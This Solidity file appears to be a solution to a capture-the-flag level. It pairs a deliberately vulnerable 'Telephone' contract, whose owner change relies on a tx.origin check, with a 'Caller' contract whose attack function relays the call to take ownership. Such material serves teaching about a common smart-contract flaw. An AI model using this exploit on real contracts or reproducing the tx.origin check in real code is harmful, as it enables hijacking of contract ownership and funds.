
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Caller {
    function attack(address _telephone) public {
        Telephone(_telephone).changeOwner(tx.origin);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
